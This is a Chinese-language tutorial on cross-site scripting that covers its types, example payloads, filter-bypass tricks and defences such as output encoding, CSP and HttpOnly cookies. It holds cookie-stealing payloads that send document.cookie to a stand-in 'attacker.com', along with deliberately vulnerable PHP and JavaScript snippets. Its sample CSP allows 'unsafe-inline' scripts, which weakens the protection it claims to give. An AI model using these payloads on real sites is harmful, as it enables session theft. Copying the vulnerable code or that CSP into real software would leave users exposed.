人们经常将跨站脚本攻击（Cross Site Scripting）缩写为CSS，但这会与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆。因此，有人将跨站脚本攻击缩写为XSS

跨站脚本攻击（XSS）是最常见的Web安全漏洞之一，攻击者通过在网页中注入恶意脚本来窃取用户信息或执行恶意操作。我来详细介绍XSS的原理、类型和防护措施。

## XSS攻击原理

XSS攻击的核心是在用户浏览器中执行攻击者构造的恶意JavaScript代码。当应用程序未对用户输入进行适当过滤就直接输出到页面时，就可能发生XSS攻击。

## XSS攻击类型

**反射型XSS（Reflected XSS）**

恶意脚本通过URL参数传递并直接反射到页面中：

```html
<!-- 存在漏洞的PHP代码 -->
<?php
echo "搜索结果：" . $_GET['query'];
?>

<!-- 攻击URL -->
http://example.com/search.php?query=<script>alert('XSS')</script>
```

**存储型XSS（Stored XSS）**

恶意脚本被存储在服务器上（如数据库），每次访问时都会执行：

```html
<!-- 留言板存在漏洞的代码 -->
<div class="comment">
    用户留言：<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
</div>
```

**DOM型XSS（DOM-based XSS）**

通过修改页面DOM结构来执行恶意脚本：

```javascript
// 存在漏洞的JavaScript代码
var userInput = location.hash.substring(1);
document.getElementById('content').innerHTML = userInput;

// 攻击URL
http://example.com/page.html#<img src=x onerror=alert('XSS')>
```

## 常见XSS攻击载荷

**基础脚本注入**：
```html
<script>alert('XSS')</script>
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
```

**事件处理器注入**：
```html
<img src=x onerror=alert('XSS')>
<input type="text" onmouseover="alert('XSS')" value="移动鼠标到这里">
<body onload=alert('XSS')>
```

**伪协议注入**：
```html
<a href="javascript:alert('XSS')">点击链接</a>
<iframe src="javascript:alert('XSS')"></iframe>
```

**绕过过滤的技巧**：
```html
<ScRiPt>alert('XSS')</ScRiPt>
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
<img src="" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
```

## XSS防护措施

**输入验证和过滤**

```php
// PHP示例：输入过滤
function sanitizeInput($input) {
    // 移除HTML标签
    $input = strip_tags($input);
    // HTML实体编码
    $input = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
    return $input;
}

$userInput = sanitizeInput($_POST['comment']);
```

```javascript
// JavaScript示例：输入验证
function sanitizeInput(input) {
    const div = document.createElement('div');
    div.textContent = input;
    return div.innerHTML;
}
```

**输出编码**

```php
// PHP输出编码
echo htmlspecialchars($userContent, ENT_QUOTES, 'UTF-8');

// 对于不同上下文的编码
function htmlEncode($str) {
    return htmlspecialchars($str, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

function jsEncode($str) {
    return json_encode($str, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
}
```

**Content Security Policy (CSP)**

```html
<!-- 在HTML头部设置CSP -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';">
```

```php
// 通过HTTP头设置CSP
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

**使用安全的DOM操作**

```javascript
// 危险的做法
element.innerHTML = userInput;

// 安全的做法
element.textContent = userInput;
// 或者
element.innerText = userInput;

// 创建元素时使用安全方法
const textNode = document.createTextNode(userInput);
element.appendChild(textNode);
```

**Cookie安全设置**

```php
// 设置HttpOnly和Secure标志
setcookie('session_id', $sessionId, [
    'expires' => time() + 3600,
    'path' => '/',
    'domain' => '.example.com',
    'secure' => true,      // 仅HTTPS传输
    'httponly' => true,    // 防止JavaScript访问
    'samesite' => 'Strict' // 防止CSRF攻击
]);
```

## 框架级别的防护

**React防护**

```jsx
// React默认会转义内容
function UserComment({ comment }) {
    return <div>{comment}</div>; // 自动转义

    // 危险的做法（需要明确使用）
    return <div dangerouslySetInnerHTML={{__html: comment}} />;
}
```

**Vue.js防护**

```vue
<template>
  <!-- 自动转义 -->
  <div>{{ userInput }}</div>
  
  <!-- 危险的做法 -->
  <div v-html="userInput"></div>
</template>
```

## 检测和测试XSS漏洞

**手工测试载荷**：
```html
<script>alert('XSS')</script>
'"><script>alert('XSS')</script>
javascript:alert('XSS')
<img src=x onerror=alert('XSS')>
```

**自动化工具**：
- OWASP ZAP
- Burp Suite
- XSStrike
- dalfox

**代码审计要点**：
检查所有用户输入点，包括URL参数、表单数据、HTTP头、Cookie等，确保在输出前进行适当的编码和过滤。

## 最佳实践总结

采用纵深防御策略，结合输入验证、输出编码、CSP策略和安全的编程实践，可以有效防护XSS攻击。重要的是要在开发过程中始终保持安全意识，对所有用户输入保持怀疑态度，并定期进行安全测试和代码审计。

### 参考

* [根据白名单过滤 HTML(防止 XSS 攻击)](https://github.com/leizongmin/js-xss/blob/master/README.zh.md)